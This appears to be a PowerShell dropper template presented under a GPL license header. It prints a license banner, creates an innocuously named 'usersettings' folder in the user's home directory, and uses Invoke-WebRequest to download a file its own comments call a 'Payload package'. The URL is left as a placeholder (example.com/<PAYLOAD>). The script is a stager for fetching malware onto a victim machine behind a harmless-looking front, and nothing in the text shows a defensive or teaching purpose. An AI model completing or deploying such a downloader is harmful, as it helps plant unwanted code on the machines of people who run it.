#   LICENSE:
#
#   This software or part of it was developed by TreeFrog Developement.
#   Copyright (C) 2023  Liam Owen/orangetreefrog4
#   Copyright (C) 2023  TreeFrog Development
#
#   This program is free software: you can redistribute it and/or modify
#   it under the terms of the GNU General Public License as published by
#   the Free Software Foundation, either version 3 of the License, or
#   (at your option) any later version.
#
#   This program is distributed in the hope that it will be useful,
#   but WITHOUT ANY WARRANTY; without even the implied warranty of
#   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#   GNU General Public License for more details.
#
#   You should have received a copy of the GNU General Public License
#   along with this program.  If not, see <https://www.gnu.org/licenses/>.
clear
Write-Output -InputObject "This software or part of it was developed by TreeFrog Developement.
Copyright (C) 2023  Liam Owen/orangetreefrog4
Copyright (C) 2023  TreeFrog Development
This program comes with ABSOLUTELY NO WARRANTY; for details type `show w'.
This is free software, and you are welcome to redistribute it
under certain conditions; type `show c' for details."
Start-Sleep -Seconds 1
clear
New-Item -Name "usersettings" -Path $HOME -ItemType Directory -Force
Invoke-WebRequest -Method Get -Uri <# Payload package goes HERE --> #> "" <# https://example.com/<PAYLOAD> #>-OutFile $HOME"/usersettings/"
